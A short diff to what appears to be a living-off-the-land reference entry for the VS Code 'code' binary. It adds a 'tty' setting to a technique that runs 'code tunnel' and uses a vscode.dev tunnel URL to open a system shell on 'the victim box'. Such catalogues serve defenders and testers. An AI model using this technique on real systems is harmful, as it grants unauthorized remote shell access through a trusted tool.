@@ -32,6 +32,7 @@ functions:
         Navigate to <https://vscode.dev/tunnel/xxxxxx> where a remote VS Code instance can be used to spawn a system shell on the victim box.
 
         From the menu, select "View" -> "Terminal".
+    tty: true
   upload:
   - code: |-
       code tunnel --name xxxxxx
